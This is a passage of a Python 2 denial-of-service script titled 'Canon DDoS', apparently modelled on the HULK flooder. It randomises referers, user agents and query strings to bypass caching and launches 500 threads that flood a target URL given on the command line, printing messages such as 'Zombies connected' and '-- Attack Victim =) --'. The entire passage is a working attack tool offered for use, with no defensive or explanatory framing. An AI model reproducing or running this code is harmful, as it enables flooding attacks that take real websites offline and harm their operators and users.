	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://coccoc.com/search#query=')
	headers_referers.append('http://www.search.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():

	print 'Su dung: Canon.py [URL]'
	print 'U R DEAD!'



	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10000)) + '=' + buildblock(random.randint(3,1000)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,1000)))
	request.add_header('Keep-Alive', random.randint(110,12000))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'Code 500 Attack'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Zombies connected" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- Attack Victim =) --"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
		
	else:
		print "-- Canon DDoS --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe() 
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start() 
